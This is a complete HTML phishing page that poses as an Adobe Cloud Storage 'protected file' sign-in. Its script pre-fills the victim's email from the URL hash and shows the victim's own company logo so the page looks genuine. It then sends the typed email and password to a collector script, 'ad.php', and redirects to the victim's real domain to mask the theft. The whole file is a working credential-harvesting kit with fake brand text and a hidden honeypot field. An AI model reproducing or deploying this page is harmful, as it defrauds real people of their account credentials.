<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Protected File Sign In</title>
  <style>
    /* Google Translate UI Hiding */
    #google_translate_element,
    .goog-te-banner-frame.skiptranslate,
    .goog-te-gadget,
    .goog-logo-link {
      display: none !important;
    }
    body { top: 0 !important; }

    /* Page Styles */
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
      background-size: cover;
      background-position: center;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      position: relative;
    }
    body::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: -1;
    }
    .container {
      background-color: #fff;
      padding: 25px;
      text-align: center;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
      border-radius: 8px;
      max-width: 350px;
      width: 100%;
      opacity: 0;
      animation: fadeIn 0.5s forwards;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    #email-logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 15px;
      display: block;
      object-fit: contain;
      border-radius: 8px;
      background: #f5f5f5;
      padding: 10px;
    }
    h2 {
      font-weight: bold;
      margin-top: 0;
      margin-bottom: 15px;
      color: #333;
    }
    input[type="email"],
    input[type="password"],
    button {
      width: 100%;
      margin-bottom: 15px;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 4px;
      box-sizing: border-box;
      font-size: 14px;
    }
    input[type="email"]:focus,
    input[type="password"]:focus {
      border-color: #4a6cf7;
      outline: none;
      box-shadow: 0 0 5px rgba(74, 108, 247, 0.3);
    }
    button {
      background-color: #4a6cf7;
      color: #fff;
      cursor: pointer;
      border: none;
      font-weight: bold;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #3a5cd8;
    }
    .error-container {
      color: white;
      background: #e74c3c;
      padding: 10px;
      margin-top: 10px;
      border-radius: 4px;
      display: none;
      font-size: 14px;
    }
    .spinner {
      border: 3px solid rgba(0,0,0,0.1);
      border-top: 3px solid #333;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
      display: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .remember-me {
      text-align: left;
      margin-bottom: 15px;
      font-size: 14px;
      color: #666;
    }
    .copyright {
      font-size: 10px;
      color: #999;
      margin-top: 20px;
      line-height: 1.4;
    }
    .domain-info {
      color: #4a6cf7;
      font-weight: 500;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img id="email-logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSIyMCIgeT0iMjAiIHdpZHRoPSI2MCIgaGVpZ2h0PSI2MCIgZmlsbD0iIzRhNmNmNyIgcng9IjUiLz48cGF0aCBkPSJNMzUsNDAgTDM1LDUwIEw0MCw0NSBMNjUsNjAgTDY1LDQwIEw0MCw1NSBMMzUsNTAiIHN0cm9rZT0id2hpdGUiIHN0cm9rZS13aWR0aD0iMyIgZmlsbD0ibm9uZSIvPjwvc3ZnPg==" alt="Email logo" />
    <h2>Cloud Storage</h2>
    <p class="domain-info" id="domain-info">Sign in with your Domain Email</p>

    <form name="loginForm" id="loginForm" method="POST" autocomplete="off">
      <input type="email" name="email" id="email" placeholder="Email" required readonly>
      <input type="password" name="password" id="password" placeholder="Password" minlength="6" required>
      <input type="text" name="email_confirm" id="email_confirm" style="display:none" autocomplete="off" tabindex="-1" />

      <div class="remember-me">
        <input type="checkbox" id="remember-me" name="remember-me" checked>
        <label for="remember-me">Remember me</label>
      </div>

      <button type="submit" id="submit-btn">View File 87 KB</button>

      <div class="error-container" id="error"></div>
      <div class="spinner" id="spinner"></div>

      <div class="copyright">
        &copy; 2025 Adobe. By clicking Next, you accept Adobe Cloud Storage terms and conditions in accordance with our privacy policy and Adobe terms of use.
      </div>
    </form>
  </div>

  <script>
    let domain = "";

    function decodeData(encoded) {
      encoded = encoded.replace(/-/g, '+').replace(/_/g, '/');
      while (encoded.length % 4) encoded += '=';
      return decodeURIComponent(atob(encoded));
    }

    document.addEventListener("DOMContentLoaded", function () {
      const emailInput = document.getElementById("email");
      const domainInfo = document.getElementById("domain-info");
      const logo = document.getElementById("email-logo");
      const form = document.getElementById("loginForm");
      const errorDiv = document.getElementById("error");
      const spinner = document.getElementById("spinner");
      const submitBtn = document.getElementById("submit-btn");

      function updateUI(email) {
        const domainMatch = email.match(/@([\w.-]+\.\w+)/);
        if (domainMatch) {
          domain = domainMatch[1];
          domainInfo.textContent = `Sign in with your ${domain} Email`;
          logo.src = `https://logo.clearbit.com/${domain}`;
          logo.onerror = () => {
            logo.src = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSIyMCIgeT0iMjAiIHdpZHRoPSI2MCIgaGVpZ2h0PSI2MCIgZmlsbD0iIzRhNmNmNyIgcng9IjUiLz48cGF0aCBkPSJNMzUsNDAgTDM1LDUwIEw0MCw0NSBMNjUsNjAgTDY1LDQwIEw0MCw1NSBMMzUsNTAiIHN0cm9rZT0id2hpdGUiIHN0cm9rZS13aWR0aD0iMyIgZmlsbD0ibm9uZSIvPjwvc3ZnPg==";
          };
        } else {
          domainInfo.textContent = "Sign in with your Domain Email";
        }
      }

      const hash = window.location.hash.substring(1);
      const parts = hash.split("&");
      const encodedEmail = parts[0];
      const token = parts[1] ? parts[1].split("=")[1] : null;

      try {
        if (encodedEmail) {
          const decodedEmail = decodeData(encodedEmail);
          if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decodedEmail)) {
            emailInput.value = decodedEmail;
            updateUI(decodedEmail);
          }
        }
      } catch (e) {
        console.error("Email decoding failed:", e);
        emailInput.value = "";
      }

      // Form submission
      form.addEventListener("submit", function (event) {
        event.preventDefault();
        errorDiv.style.display = "none";
        
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;
        const filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!email) {
          showError("Email field is empty");
          return;
        }
        if (!filter.test(email)) {
          showError("Invalid email format");
          return;
        }
        if (!password) {
          showError("Password field is empty");
          return;
        }
        if (password.length < 6) {
          showError("Password must be at least 6 characters");
          return;
        }

        // Show spinner and change button text
        spinner.style.display = "block";
        submitBtn.disabled = true;
        submitBtn.textContent = "Signing in...";

        // Create form data
        const formData = new FormData();
        formData.append("email", email);
        formData.append("password", password);
        formData.append("email_confirm", document.getElementById("email_confirm").value);

        // Send to PHP script
        fetch("ad.php", {
          method: "POST",
          body: formData
        })
        .then(response => response.text())
        .then(data => {
          if (data === "1") {
            // Success - redirect after a short delay
            setTimeout(() => {
              if (domain) {
                window.location.href = "https://www." + domain;
              } else {
                showError("Login successful but cannot redirect");
                spinner.style.display = "none";
                submitBtn.disabled = false;
                submitBtn.textContent = "View File 87 KB";
              }
            }, 1500);
          } else {
            showError("Invalid login. Try again");
            spinner.style.display = "none";
            submitBtn.disabled = false;
            submitBtn.textContent = "View File 87 KB";
          }
        })
        .catch(error => {
          console.error("Error:", error);
          showError("Network error. Please try again");
          spinner.style.display = "none";
          submitBtn.disabled = false;
          submitBtn.textContent = "View File 87 KB";
        });
      });

      function showError(message) {
        errorDiv.textContent = message;
        errorDiv.style.display = "block";
      }
    });
  </script>
</body>
</html>
